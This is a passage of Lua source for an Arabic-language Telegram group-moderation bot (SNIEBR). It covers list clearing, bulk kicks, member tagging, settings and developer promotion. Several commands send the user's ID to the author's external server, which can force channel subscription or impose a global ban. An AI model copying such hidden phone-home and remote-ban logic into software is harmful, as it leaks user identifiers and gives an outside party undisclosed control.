local SNIEBR = '🗑 ┇ تم حذف سحكاتك '
send(msg.chat_id_, msg.id_, 1, SNIEBR, 1, 'md')
end
if text:match("^مسح قائمه العام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
text = '☑┇تم مسح قائمه العام'
datahmade:del('SNIEBR:'..bot_id..'gbanned:')
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
if text:match("^مسح المكتومين عام") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
text = '☑┇ تم مسح المكتومين عام'
datahmade:del('SNIEBR:'..bot_id..'gmuted:')
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
if (text:match("^(تعين عدد الاحرف) (%d+)$") and is_mod(msg)) then
SNIEBR_0 = {string.match(text, "^(تعين عدد الاحرف) (%d+)$")}
send(msg.chat_id_, msg.id_, 1, '☑┇ تم تعين عدد الاحرف {`'..SNIEBR_0[2]..'`}', 1, 'md')
datahmade:set("SNIEBR:not:word:"..bot_id..msg.chat_id_,SNIEBR_0[2])
end
if text:match("^مسح (.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^(مسح) (.*)$")}
if txt[2] == 'banlist' or txt[2] == 'Banlist' or txt[2] == 'المحظورين' then
datahmade:del('SNIEBR:'..bot_id..'banned:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '🚷┇ تم مسح المحظورين من البوت  ', 1, 'md')
end
if txt[2] == 'creators' and is_creatorbasic(msg) or txt[2] == 'creatorlist' and is_creatorbasic(msg) or txt[2] == 'Creatorlist' and is_creatorbasic(msg) or txt[2] == 'Creators' and is_creatorbasic(msg) or txt[2] == 'المنشئين' and is_creatorbasic(msg) then
datahmade:del('SNIEBR:'..bot_id..'creator:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '┇ تم مسح قائمة المنشئين  ', 1, 'md')
end
if txt[2] == 'البوتات' then
local function cb(extra,result,success)
local bots = result.members_
for i=0 , #bots do
if tonumber(bots[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,bots[i].user_id_)
end
end
end
bot.channel_get_bots(msg.chat_id_,cb)
send(msg.chat_id_, msg.id_, 1, '☑┇تم مسح جميع البوتات', 1, 'md')
end
if txt[2] == 'الادمنيه' and (is_owner(msg) or is_creatorbasic(msg)) then
datahmade:del('SNIEBR:'..bot_id..'mods:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '👨🏻‍🎨┇ تم مسح  قائمة الادمنية  ', 1, 'md')
end
if  txt[2] == 'الاعضاء المميزين' and (is_owner(msg) or is_creatorbasic(msg)) then
datahmade:del('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '┇ تم مسح  قائمة الاعضاء المميزين  ', 1, 'md')
end
if  txt[2] == 'المميزين' and (is_owner(msg) or is_creatorbasic(msg)) then
datahmade:del('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '┇ تم مسح  قائمة الاعضاء المميزين  ', 1, 'md')
end
if  txt[2] == 'المدراء' and (is_creator(msg) or is_creatorbasic(msg)) then
datahmade:del('SNIEBR:'..bot_id..'owners:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '┇ تم مسح  قائمة المدراء  ', 1, 'md')
end
if  txt[2] == 'القوانين' then
datahmade:del('SNIEBR:'..bot_id..'rules'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑┇تم مسح القوانين المحفوظه', 1, 'md')
end
if txt[2] == 'الرابط' then
datahmade:del('SNIEBR:'..bot_id..'group:link'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑┇تم مسح الرابط المحفوظ', 1, 'md')
end
if txt[2] == 'قائمه المنع' then
datahmade:del('SNIEBR:'..bot_id..'filters:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑┇تم مسح قائمه المنع', 1, 'md')
end
if  txt[2] == 'المكتومين' then
datahmade:del('SNIEBR:'..bot_id..'muted:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '📟┇ تم مسح قائمه المكتومين ', 1, 'md')
end
end
if (text and (text == "تعطيل الطرد" or text == "تعطيل الحظر") and (is_creator(msg) or is_creatorbasic(msg))) then
datahmade:set("SNIEBR:lock:ban_and_kick"..bot_id..msg.chat_id_,"SNIEBR")
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل (طرد - حضر) الاعضاء', 1, 'md')
end
if (text and (text == "تفعيل الطرد" or text == "تفعيل الحظر")  and (is_creator(msg) or is_creatorbasic(msg))) then
datahmade:del("SNIEBR:lock:ban_and_kick"..bot_id..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل (طرد - حضر) الاعضاء', 1, 'md')
end
if (text and (text == "تعطيل الرفع") and (is_creator(msg) or is_creatorbasic(msg))) then
datahmade:set("SNIEBR:lock:promote"..bot_id..msg.chat_id_,"SNIEBR")
send(msg.chat_id_, msg.id_, 1, '☑️ ● تم تعطيل الرفع ✓', 1, 'md')
end
if (text and (text == "تفعيل الرفع")  and (is_creator(msg) or is_creatorbasic(msg))) then
datahmade:del("SNIEBR:lock:promote"..bot_id..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑️ ● تم تفعيل الرفع ✓', 1, 'md')
end
if text:match("^اضافه قائمه المحظورين$") and (is_creator(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^(اضافه قائمه المحظورين)$")}
local function cb(extra,result,success)
local list = result.members_
for k,v in pairs(list) do
bot.addChatMember(msg.chat_id_, v.user_id_, 200, dl_cb, nil)
end
text = '☑┇تم اضافه قائمه المحظورين للمجموعه'
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
bot.channel_get_kicked(msg.chat_id_,cb)
end
if text:match("^طرد المحذوفين$") and (is_creator(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^(طرد المحذوفين)$")}
local function getChatId(chat_id)
local chat = {}
local chat_id = tostring(chat_id)
if chat_id:match('^-100') then
local channel_id = chat_id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = chat_id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
local function check_delete(arg, data)
for k, v in pairs(data.members_) do
local function clean_cb(arg, data)
if not data.first_name_ then
bot.changeChatMemberStatus(msg.chat_id_, data.id_, "Kicked")
end
end
bot.getUser(v.user_id_, clean_cb)
end
text = '☑┇تم طرد الحسابات المحذوفه'
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 5000}, check_delete, nil)
end
if text:match("^طرد المتروكين$") and (is_creator(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^(طرد المتروكين)$")}
local function getChatId(chat_id)
local chat = {}
local chat_id = tostring(chat_id)
if chat_id:match('^-100') then
local channel_id = chat_id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = chat_id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
local function check_deactive(arg, data)
for k, v in pairs(data.members_) do
local function clean_cb(arg, data)
if data.type_.ID == "UserTypeGeneral" then
if data.status_.ID == "UserStatusEmpty" then
bot.changeChatMemberStatus(msg.chat_id_, data.id_, "Kicked")
end
end
end
bot.getUser(v.user_id_, clean_cb)
end
text = '☑┇تم طرد الحسابات المتروكة من المجموعة'
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 5000}, check_deactive, nil)
end
if text and text == "تاك للكل" and (is_owner(msg) or is_creatorbasic(msg)) then
function tag_all(t1, t2)
local text = "👨‍👧‍👦 ┇ قائمه الاعضاء   ،\nꔹ┉♦️┉ ┉ ┉ ┉♦️┉ꔹ \n"
i = 0
for k, v in pairs(t2.members_) do
i = i + 1
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v.user_id_)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..i.."|</b>~⪼(@"..username..")\n"
end
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
print(text)
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tag_all,nil)
end
if text:match("^ادمنيه المجموعه$") and (is_owner(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^ادمنيه المجموعه$")}
local function cb(extra,result,success)
local list = result.members_
text = '📊┇ادمنيه الكروب\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n'
local n = 0
for k,v in pairs(list) do
n = (n + 1)
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v.user_id_)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..n.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..n.."|</b>~⪼(<code>"..v.user_id_.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
bot.channel_get_admins(msg.chat_id_,cb)
end
if text:match("^رفع الادمنيه$") and (is_owner(msg) or is_creatorbasic(msg)) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local txt = {string.match(text, "^رفع الادمنيه$")}
local function cb(extra,result,success)
local list = result.members_
moody = '📊┇ تم رفع ادمنيه المجموعه في البوت\n'
local n = 0
for k,v in pairs(list) do
n = (n + 1)
local hash =  'SNIEBR:'..bot_id..'mods:'..msg.chat_id_
datahmade:sadd(hash, v.user_id_)
end
send(msg.chat_id_, msg.id_, 1, moody, 1, 'html')
end
bot.channel_get_admins(msg.chat_id_,cb)
end
if text:match("^الاعدادات$") and (is_mod(msg) or is_creatorbasic(msg)) then
if datahmade:get("lock_media:SNIEBR"..msg.chat_id_..bot_id) then
mute_all = '✔┇'
else
mute_all = '✖┇'
end
------------
if datahmade:get("lock_chat:SNIEBR"..msg.chat_id_..bot_id) then
mute_text = '✔┇'
else
mute_text = '✖┇'
end
------------
if datahmade:get("lock_photo:SNIEBR"..msg.chat_id_..bot_id) then
mute_photo = '✔┇'
else
mute_photo = '✖┇'
end
------------
if datahmade:get("lock_video:SNIEBR"..msg.chat_id_..bot_id) then
mute_video = '✔┇'
else
mute_video = '✖┇'
end
if datahmade:get("lock_note:SNIEBR"..msg.chat_id_..bot_id) then
mute_note = '✔┇'
else
mute_note = '✖┇'
end
------------
if datahmade:get("lock_gif:SNIEBR"..msg.chat_id_..bot_id) then
mute_gifs = '✔┇'
else
mute_gifs = '✖┇'
end
------------
if not datahmade:get('SNIEBR:'..bot_id..'flood:max:'..msg.chat_id_) then
flood_m = 10
else
flood_m = datahmade:get('SNIEBR:'..bot_id..'flood:max:'..msg.chat_id_)
end
if not datahmade:get( 'SNIEBR:'..bot_id..'flood:time:'..msg.chat_id_) then
flood_t = 10
else
flood_t = datahmade:get( 'SNIEBR:'..bot_id..'flood:time:'..msg.chat_id_)
end
------------
if datahmade:get("lock_audeo:SNIEBR"..msg.chat_id_..bot_id) then
mute_music = '✔┇'
else
mute_music = '✖┇'
end
------------
if datahmade:get("lock_bot:SNIEBR"..msg.chat_id_..bot_id) then
mute_bots = '✔┇'
else
mute_bots = '✖┇'
end

if datahmade:get("lock_botAndBan:SNIEBR"..msg.chat_id_..bot_id) then
mute_botsb = '✔┇'
else
mute_botsb = '✖┇'
end
if datahmade:get("lock_lllll:SNIEBR"..msg.chat_id_..bot_id) then
mute_flood = '✔┇'
else
mute_flood = '✖┇'
end
------------
if datahmade:get("lock_inline:SNIEBR"..msg.chat_id_..bot_id) then
mute_in = '✔┇'
else
mute_in = '✖┇'
end
------------
if datahmade:get("lock_voice:SNIEBR"..msg.chat_id_..bot_id) then
mute_voice = '✔┇'
else
mute_voice = '✖┇'
end
------------
if datahmade:get("lock_edit:SNIEBR"..msg.chat_id_..bot_id) then
mute_edit = '✔┇'
else
mute_edit = '✖┇'
end
------------
if datahmade:get("lock_link:SNIEBR"..msg.chat_id_..bot_id) then
mute_links = '✔┇'
else
mute_links = '✖┇'
end
------------
if datahmade:get("lock_pin:SNIEBR"..msg.chat_id_..bot_id) then
lock_pin = '✔┇'
else
lock_pin = '✖┇'
end

if datahmade:get("lock_files:SNIEBR"..msg.chat_id_..bot_id) then
mute_doc = '✔┇'
else
mute_doc = '✖┇'
end

if datahmade:get("lock_mark:SNIEBR"..msg.chat_id_..bot_id) then
mute_mdd = '✔┇'
else
mute_mdd = '✖┇'
end
------------
if datahmade:get("lock_stecker:SNIEBR"..msg.chat_id_..bot_id) then
lock_sticker = '✔┇'
else
lock_sticker = '✖┇'
end
------------
if datahmade:get("lock_new:SNIEBR"..msg.chat_id_..bot_id) then
lock_tgservice = '✔┇'
else
lock_tgservice = '✖┇'
end
------------
if datahmade:get("lock_tag:SNIEBR"..msg.chat_id_..bot_id) then
lock_htag = '✔┇'
else
lock_htag = '✖┇'
end

if datahmade:get("lock_sarha:SNIEBR"..msg.chat_id_..bot_id) then
lock_cmd = '✔┇'
else
lock_cmd = '✖┇'
end
------------
if datahmade:get("lock_username:SNIEBR"..msg.chat_id_..bot_id) then
lock_tag = '✔┇'
else
lock_tag = '✖┇'
end
------------
if datahmade:get("lock_contact:SNIEBR"..msg.chat_id_..bot_id) then
lock_contact = '✔┇'
else
lock_contact = '✖┇'
end
------------
if datahmade:get("lock_en:SNIEBR"..msg.chat_id_..bot_id) then
lock_english = '✔┇'
else
lock_english = '✖┇'
end
------------
if datahmade:get("lock_ar:SNIEBR"..msg.chat_id_..bot_id) then
lock_arabic = '✔┇'
else
lock_arabic = '✖┇'
end
------------
if datahmade:get("lock_fwd:SNIEBR"..msg.chat_id_..bot_id) then
lock_forward = '✔┇'
else
lock_forward = '✖┇'
end

if datahmade:get('SNIEBR:'..bot_id..'rep:mute'..msg.chat_id_) then
lock_rep = '✔┇'
else
lock_rep = '✖┇'
end
------------
if datahmade:get('SNIEBR:'..bot_id..'repsudo:mute'..msg.chat_id_) then
lock_repsudo = '✔┇'
else
lock_repsudo = '✖┇'
end
------------
if datahmade:get('SNIEBR:'..bot_id..'repowner:mute'..msg.chat_id_) then
lock_repowner = '✔┇'
else
lock_repowner = '✖┇'
end
------------
if datahmade:get('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_) then
lock_id = '✔┇'
else
lock_id = '✖┇'
end
------------
if datahmade:get('SNIEBR:'..bot_id..'pin:mute'..msg.chat_id_) then
lock_pind = '✔┇'
else
lock_pind = '✖┇'
end
------------
if datahmade:get('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_) then
lock_id_photo = '✔┇'
else
lock_id_photo = '✖┇'
end
------------
if datahmade:get( 'SNIEBR:'..bot_id.."welcome"..msg.chat_id_) then
send_welcome = '✔┇'
else
send_welcome = '✖┇'
end
------------
local ex = datahmade:ttl( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_)
if ex == -1 then
exp_dat = 'لا نهائي'
else
exp_dat = math.floor(ex / 86400) + 1
end
------------
local TXT = "🗑┇اعدادات المجموعه بالمسح\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n✔┇~⪼ مفعل\n✖┇~⪼ معطل\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
..mute_all.."الميديا".."\n"
..mute_links.." الروابط".."\n"
..mute_edit .." التعديل".."\n"
..mute_bots .." البوتات".."\n"
..mute_botsb.." البوتات بالطرد".."\n"
..lock_english.." اللغه الانكليزيه".."\n"
..lock_forward.." اعاده التوجيه".."\n"
..lock_pin.." التثبيت".."\n"
..lock_arabic.." اللغه العربيه".."\n"
..lock_htag.." التاكات".."\n"
..lock_tag.." المعرفات".."\n"
..lock_tgservice.." الاشعارات".."\n"
..mute_flood.." التكرار".."\n\n"
..mute_text.." الدردشه".."\n"
..mute_gifs.." الصور المتحركه".."\n"
..mute_voice.." الصوتيات".."\n"
..mute_music.." الاغاني".."\n"
..mute_in.." الانلاين".."\n"
..lock_sticker.." الملصقات".."\n\n"
..lock_contact.." جهات الاتصال".."\n"
..mute_video.." الفيديوهات".."\n"
..lock_cmd.." الشارحه".."\n"
..mute_mdd.." الماركدون".."\n"
..mute_doc.." الملفات".."\n"
..mute_photo.." الصور".."\n"
..mute_note.." بصمه الفيديو".."\n"
..lock_repsudo.." ردود المطور".."\n\n"
..lock_repowner.." ردود المدير".."\n"
..lock_id.."الايدي".."\n"
..lock_pind.."خاصية التثبيت".."\n"
..lock_id_photo.."الايدي بالصوره".."\n"
..send_welcome.." الترحيب".."\n"
.."┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉  \n"
..'🔗┇عدد التكرار : '..flood_m..'\n'
..'🔗┇زمن التكرار : '..flood_m..'\n'
..'🔗┇انقضاء البوت: '..exp_dat..' يوم \n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'
send(msg.chat_id_, msg.id_, 1, TXT, 1, 'md')
end

if (text and text == 'قفل تعديل المجموعه')  and  (is_creator(msg) or is_creatorbasic(msg)) then
local tsX_o = datahmade:get("group_edit:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
datahmade:set("group_edit:SNIEBR"..msg.chat_id_..bot_id,true)
tsX000("lock",msg,"🔐┇ تم قفل تعديل المجموعه ")
else
tsX000("lock",msg,"🔐┇ تم قفل تعديل المجموعه بالفعل")
end
end
if (text and text == 'فتح تعديل المجموعه')  and  (is_creator(msg) or is_creatorbasic(msg)) then
local tsX_o = datahmade:get("group_edit:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇ بالفعل فتح تعديل المجموعه ")
else
tsX000("lock",msg,"⚠️┇ تم فتح تعديل المجموعه ")
datahmade:del("group_edit:SNIEBR"..msg.chat_id_..bot_id)
end
end

if (text and text == 'تفعيل اطردني') and (is_owner(msg) or is_creatorbasic(msg)) then
if not datahmade:get('SNIEBR:'..bot_id..'kickme:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '♨️ ┇ امر اطردني بالفعل تم تفعيلة ', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '♨️ ┇ امر اطردني تم تفعيلة ', 1, 'md')
datahmade:del('SNIEBR:'..bot_id..'kickme:mute'..msg.chat_id_)
end
end
if (text and text == 'تعطيل اطردني') and (is_owner(msg) or is_creatorbasic(msg)) then
if datahmade:get('SNIEBR:'..bot_id..'kickme:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🚳┇ تم تعطيل امر اطردني بالفعل ', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '🚳┇ تم تعطيل امر اطردني ', 1, 'md')
datahmade:set('SNIEBR:'..bot_id..'kickme:mute'..msg.chat_id_,true)
end
end

if text:match("^اطردني$") then
if not datahmade:get('SNIEBR:'..bot_id..'kickme:mute'..msg.chat_id_) then
redis:set('SNIEBR:'..bot_id..'kickyess'..msg.sender_user_id_..'', 'kickyes')
redis:set('SNIEBR:'..bot_id..'kicknoo'..msg.sender_user_id_..'', 'kickno')
send(msg.chat_id_, msg.id_, 1, '🚯┇ ارسل : نعم ، ليتم طردك  \n‼️┇ ارسل ؛ لا ، لالغاء الامر  ', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '🚳┇ امر اطردني معطل ', 1, 'md')
end
end
local yess = redis:get('SNIEBR:'..bot_id..'kickyess'..msg.sender_user_id_..'')
if yess == 'kickyes' then
if text:match("^نعم$") then
if is_vip(msg) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع طرد (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
return false 
else
local yess = redis:get('SNIEBR:'..bot_id..'kickyess'..msg.sender_user_id_..'')
if yess == 'kickyes' then
chat_kick(msg.chat_id_, msg.sender_user_id_)
redis:del('SNIEBR:'..bot_id..'kickyess'..msg.sender_user_id_..'', 'kickyes')
redis:del('SNIEBR:'..bot_id..'kicknoo'..msg.sender_user_id_..'', 'kickno')
send(msg.chat_id_, msg.id_, 1, '🕺🏿┇ لقد تم طردك   ', 1, 'md')
end
end
end
if text:match("^لا$") then
local noo = redis:get('SNIEBR:'..bot_id..'kicknoo'..msg.sender_user_id_..'')
if noo == 'kickno' then
redis:del('SNIEBR:'..bot_id..'kickyess'..msg.sender_user_id_..'', 'kickyes')
redis:del('SNIEBR:'..bot_id..'kicknoo'..msg.sender_user_id_..'', 'kickno')
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ تم الغاء الامر  ', 1, 'md')
end
end
end
if (text and text == 'حذف اسم البوت') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
redis:del('SNIEBR:'..bot_id..'name_bot')
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ تم حذف اسم البوت', 1, 'html')
end
if (text and text == 'وضع اسم للبوت' or text == 'تغير اسم البوت' ) then
if tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '🙋??‍♂️┇ الان ارسل اسم البوت ', 1, 'html')
redis:set('SNIEBR:'..bot_id..'textst'..msg.sender_user_id_..'', 'msg')
return false 
else
send(msg.chat_id_, msg.id_, 1, 'هذا الامر خاص بلمطور الاساسي', 1, 'html')
return false 
end
end
if text:match("^(.*)$") then
local keko2 = redis:get('SNIEBR:'..bot_id..'textst'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ تم حفظ الاسم ', 1, 'html')
redis:set('SNIEBR:'..bot_id..'textst'..msg.sender_user_id_..'', 'no')
redis:set('SNIEBR:'..bot_id..'name_bot', text)
return false end
end


if (text and text == 'تغير امر المطور بالكليشه') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('SNIEBR:'..bot_id..'texts'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko2 = redis:get('SNIEBR:'..bot_id..'texts'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('SNIEBR:'..bot_id..'texts'..msg.sender_user_id_..'', 'no')
redis:set('SNIEBR:'..bot_id..'text_sudo', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
--------------------------------
if (text and text == (redis:get('SNIEBR:'..bot_id..'name_bot') or 'سنايبر'))then
name_bot = (redis:get('SNIEBR:'..bot_id..'name_bot') or 'سنايبر')
local namebot = {
"عمري فداك "..name_bot.. " كول حب ",
"كول حبيبي ؟ اني "..name_bot,
"شبيك يمعود شكو ",
"نايم حبي نايم ",
"ها ضلعي",
"ها شني ؟",
"حبي داخابر دعبل :| ،",
"دوخر شبيك دوختني :|",
'ها حبي وياك مكتب ئلسيد .',
'الو الو رد مخنوك',
'ها يحلو كول',
'عمري الحلو',
'صاعد اتصال ويا الحب دقيقة وجيك 😘💘',
'مشغول حالياً 🌚🌸',
'لابسك لتلح',
" هايروحي؟ "..name_bot,
}
name = math.random(#namebot)
send(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') 
return false end
if (text and text == 'بوت')then
name_bot = (redis:get('SNIEBR:'..bot_id..'name_bot') or 'سنايبر')
send(msg.chat_id_, msg.id_, 1, "حياتي لدكول بوت اسمي "..name_bot, 1, 'html') 
end
--------------------------------------
if text:match("^[Dd][Ee][Vv]$")or text:match("^مطور بوت$") or text:match("^مطورين$") or text:match("^مطور البوت$") or text:match("^مطور$") or text:match("^المطور$") and msg.reply_to_message_id_ == 0 then
local text_sudo = redis:get('SNIEBR:'..bot_id..'text_sudo')
local nkeko = redis:get('SNIEBR:'..bot_id..'nmkeko')
local nakeko = redis:get('SNIEBR:'..bot_id..'nakeko')
if text_sudo then
send(msg.chat_id_, msg.id_, 1, text_sudo, 1, 'md') 
else
send(msg.chat_id_, msg.id_, 1, "🗃┇ عذراً لم يتم وضع كليشة المطور \n اذا كنت المطور الاساسي للبوت\n قم بارسال (تغير امر المطور بالكليشه) لوضع الكليشة 🎚", 1, 'md') 
end
end
for k,v in pairs(sudo_users) do
if text:match("^تغير امر المطور$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '• `الان يمكنك ارسال رقم المطور` 🗳', 1, 'md')
redis:set('SNIEBR:'..bot_id..'nkeko'..msg.sender_user_id_..'', 'msg')
return false end
end
if text:match("^+(.*)$") then
local kekoo = redis:get('SNIEBR:'..bot_id..'sudoo'..text..'')
local keko2 = redis:get('SNIEBR:'..bot_id..'nkeko'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '• `الان يمكنك ارسال الاسم الذي تريده` 🏷', 1, 'md')
redis:set('SNIEBR:'..bot_id..'nmkeko', text)
redis:set('SNIEBR:'..bot_id..'nkeko'..msg.sender_user_id_..'', 'mmsg')
return false end
end
if text:match("^(.*)$") then
local keko2 = redis:get('SNIEBR:'..bot_id..'nkeko'..msg.sender_user_id_..'')
if keko2 == 'mmsg' then
send(msg.chat_id_, msg.id_, 1, '• `تم حفظ الاسم يمكنك اظهار الجه بـ ارسال امر المطور` ☑', 1, 'md')
redis:set('SNIEBR:'..bot_id..'nkeko'..msg.sender_user_id_..'', 'no')
redis:set('SNIEBR:'..bot_id..'nakeko', text)
local nmkeko = redis:get('SNIEBR:'..bot_id..'nmkeko')
sendContact(msg.chat_id_, msg.id_, 0, 1, nil, nmkeko, text , "", bot_id)
return false end
end

if text:match("^اضف مطور$")  and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
function promote_by_reply(extra, result, success)
if redis:sismember('SNIEBR:'..bot_id..'dev', result.sender_user_id_) then
tsX000("prore",msg,'🔖┇بالفعل تم رفعة مطور في البوت')
else
redis:set('SNIEBR:'..bot_id..'sudoo'..result.sender_user_id_..'', 'yes')
redis:sadd('SNIEBR:'..bot_id..'dev', result.sender_user_id_)
tsX000("prore",msg,'🔖┇تم رفعة مطور في البوت')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end

if text:match("^اضف مطور @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(اضف مطور) @(.*)$")}
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
function promote_by_username(extra, result, success)
if result.id_ then
redis:set('SNIEBR:'..bot_id..'sudoo'..result.id_..'', 'yes')
redis:sadd('SNIEBR:'..bot_id..'dev', result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n\n🔖┇تم رفعة مطور في البوت'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end

